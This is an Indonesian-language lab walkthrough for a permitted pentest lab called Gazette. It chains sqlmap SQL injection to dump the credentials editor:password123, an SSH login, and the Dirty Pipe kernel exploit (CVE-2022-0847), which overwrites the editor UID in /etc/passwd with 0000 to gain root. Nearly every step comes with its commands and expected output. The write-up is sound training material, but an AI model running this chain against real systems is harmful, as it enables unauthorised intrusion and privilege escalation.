# 03 — Pembahasan Detail Lab Gazette
## SQL Injection → SSH Editor → Dirty Pipe → Root

> Dokumen ini untuk pembelajaran pentest pada **lab yang berizin**.  
> Fokus pembelajaran: bagaimana credential dari SQL Injection dapat dipakai sebagai foothold SSH, lalu privilege escalation melalui kernel LPE Dirty Pipe.

---

## 1. Gambaran Umum

Lab Gazette mengajarkan alur:

```text
SQL Injection pada parameter id
→ dump database
→ dapat credential editor
→ SSH sebagai editor
→ cek kernel
→ gunakan Dirty Pipe
→ ubah UID editor pada /etc/passwd
→ su - editor
→ root
→ cari flag
```

Yang membedakan lab ini dari yang lain adalah privilege escalation dilakukan dengan eksploitasi kernel/local file overwrite, bukan salah konfigurasi sudo atau cron.

---

## 2. Data Lab

| Komponen | Nilai |
|---|---|
| Target | `192.168.56.121` |
| URL web | `http://192.168.56.121:8000/news/detail?id=1` |
| DB | `gazette` |
| Tabel credential | `users` |
| Credential | `editor:password123` |
| Foothold | SSH sebagai `editor` |
| Kernel hint | `Linux 5.10.70-1` |
| Privesc | Dirty Pipe / CVE-2022-0847 |
| Target file | `/etc/passwd` |
| Cara root | ubah UID `editor` dari `1001` menjadi `0000` |
| Cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |

---

## 3. Konsep yang Dipelajari

### 3.1 SQL Injection pada Parameter GET

URL berikut memiliki parameter `id`:

```text
/news/detail?id=1
```

Jika parameter ini langsung dipakai dalam query SQL tanpa sanitasi, attacker dapat memanipulasi query.

### 3.2 Credential Reuse

Credential aplikasi kadang digunakan ulang sebagai credential sistem. Setelah mendapat user/password dari database, kita mengujinya ke SSH.

### 3.3 Dirty Pipe

Dirty Pipe adalah Local Privilege Escalation yang dapat menulis ke file yang normalnya hanya read-only bagi user biasa. Pada lab ini, targetnya adalah `/etc/passwd`.

### 3.4 Mengapa `/etc/passwd`?

File `/etc/passwd` berisi daftar user dan UID. Jika UID user `editor` diubah menjadi `0`, maka sesi baru `editor` akan dianggap root.

---

## 4. Fase 1 — Validasi SQL Injection

### Tujuan

Membuktikan parameter `id` injectable.

### Command

```bash
URL="http://192.168.56.121:8000/news/detail?id=1"

sqlmap \
  -u "$URL" \
  -p id \
  --batch \
  --technique=U
```

### Output yang Diharapkan

```text
Parameter id is vulnerable
UNION query
DBMS: MySQL/MariaDB
```

### Penjelasan

Output ini menunjukkan bahwa `id` dapat dimanipulasi dan backend database adalah MySQL/MariaDB.

---

## 5. Fase 2 — Enumerasi Database

### Cari Database

```bash
sqlmap -u "$URL" -p id --batch --dbs
```

### Output

```text
gazette
```

### Cari Tabel

```bash
sqlmap -u "$URL" -p id --batch \
  -D gazette \
  --tables
```

### Output

```text
users
```

### Dump Credential

```bash
sqlmap -u "$URL" -p id --batch \
  -D gazette \
  -T users \
  --dump
```

### Output Lab

```text
Username : editor
Password : password123
```

### Penjelasan

Hafalan:

```text
D-T-D = Database → Tables → Dump
```

Kredensial yang ditemukan akan diuji ke SSH.

---

## 6. Fase 3 — SSH sebagai Editor

### Command

```bash
ssh editor@192.168.56.121
```

Password:

```text
password123
```

### Validasi

```bash
id
whoami
hostname
pwd
```

### Output yang Diharapkan

```text
uid=1001(editor) gid=1001(editor)
editor
/home/editor
```

### Penjelasan

Kita membutuhkan akses lokal karena Dirty Pipe adalah local privilege escalation. SQL Injection hanya memberi data; SSH memberi shell lokal.

---

## 7. Fase 4 — Cek Kernel

### Command

```bash
uname -a
cat /proc/version
```

### Output Lab

```text
Linux 5.10.70-1
```

### Penjelasan

Versi kernel menjadi petunjuk apakah jalur Dirty Pipe relevan. Namun versi kernel bukan bukti final; exploit tetap harus dicoba pada lab.

---

## 8. Fase 5 — Menyiapkan Dirty Pipe

### Tujuan

Mengompilasi PoC Dirty Pipe di target.

### Command

```bash
cd /home/editor
gcc -O2 -Wall dirtypipe.c -o dirtypipe
ls -l dirtypipe
file dirtypipe
```

### Output yang Diharapkan

```text
-rwxr-xr-x 1 editor editor ... dirtypipe
dirtypipe: ELF 64-bit LSB executable
```

### Penjelasan

PoC dikompilasi menjadi executable lokal. Jika `gcc` tidak tersedia, peserta perlu mencari compiler lain atau transfer binary yang kompatibel.

---

## 9. Fase 6 — Cari Offset UID Editor

### Tujuan

Menentukan posisi byte UID `1001` pada `/etc/passwd`.

### Command

```bash
grep -bo 'editor:x:1001:1001' /etc/passwd
```

### Output Lab

```text
2183:editor:x:1001:1001
```

### Cara Hitung Offset

String yang ditemukan:

```text
editor:x:1001:1001
```

UID `1001` dimulai setelah:

```text
editor:x:
```

Panjang `editor:x:` adalah 9 karakter. Maka:

```text
2183 + 9 = 2192
```

### Visual

```text
editor:x:1001:1001
         ^
         UID mulai di sini
```

### Catatan Penting

Jangan menghafal `2192` sebagai angka pasti. Offset bergantung isi `/etc/passwd` target. Hafalkan cara menghitungnya.

---

## 10. Fase 7 — Timpa UID 1001 Menjadi 0000

### Command

```bash
./dirtypipe /etc/passwd 2192 0000
```

Jika offset aktual berbeda, ganti `2192`.

### Output yang Diharapkan

```text
Berhasil menulis 4 byte pada offset 2192
```

### Verifikasi

```bash
grep '^editor:' /etc/passwd
```

### Output

```text
editor:x:0000:1001::/home/editor:/bin/bash
```

### Mengapa `0000`, Bukan `0`?

Karena `1001` memiliki 4 karakter. Dirty Pipe menimpa byte tanpa menggeser struktur file. Pengganti yang aman panjangnya sama:

```text
1001 → 0000
```

UID `0000` tetap dibaca sebagai UID 0 oleh sistem.

---

## 11. Fase 8 — Menjadi Root

### Command

```bash
su - editor
```

Password:

```text
password123
```

### Validasi

```bash
id
whoami
```

### Output yang Diharapkan

```text
uid=0(root) gid=1001(editor)
root
```

### Penjelasan

Sesi baru membaca `/etc/passwd` yang sudah dimodifikasi. Karena UID editor menjadi `0000`, sistem menganggap editor sebagai root.

---

## 12. Fase 9 — Cari dan Baca Flag

### Cari Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

### Output Contoh

```text
/root/flag.txt
```

### Baca Flag

```bash
cat /PATH/FLAG
```

---

## 13. Troubleshooting Gazette

### SQLMap tidak mendeteksi SQLi

```bash
sqlmap -u "$URL" -p id --batch --level=3 --risk=2
```

### SSH gagal

```bash
nmap -Pn -sV -p22 192.168.56.121
```

Cek apakah:
- credential benar;
- SSH terbuka;
- user `editor` memang ada.

### `gcc` tidak ditemukan

```bash
which gcc cc clang
```

### Dirty Pipe gagal offset

Ulangi:

```bash
grep -bo 'editor:x:1001:1001' /etc/passwd
```

Hitung ulang offset dari hasil aktual.

### `su - editor` belum root

```bash
grep '^editor:' /etc/passwd
```

Pastikan UID terbaca:

```text
editor:x:0000:1001
```

---

## 14. Ringkasan Hafalan Gazette

```text
/news/detail?id=1
sqlmap id
D gazette
T users
dump editor:password123
ssh editor
uname
compile dirtypipe
grep -bo editor:x:1001:1001
offset + 9
dirtypipe /etc/passwd OFFSET 0000
su - editor
root
find flag
cat flag
```
